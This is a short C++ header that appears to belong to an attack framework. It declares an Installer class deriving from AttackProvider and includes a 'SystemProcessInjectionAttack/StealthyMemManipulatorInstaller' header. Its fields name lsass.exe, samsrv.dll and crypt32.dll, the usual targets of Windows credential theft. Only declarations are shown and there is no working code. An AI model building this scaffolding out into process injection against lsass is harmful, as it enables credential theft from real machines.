#include "../../../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorInstaller.h"
#include "../../AttackProvider/AttackProvider.h"
#include <string>

using namespace std;

class Installer : public AttackProvider {
public:
    void Init();
    BOOL Install();
    wstring samsrvDll;
    wstring msvcrtDll;
    wstring crypt32Dll;
    wstring lsassExe;
};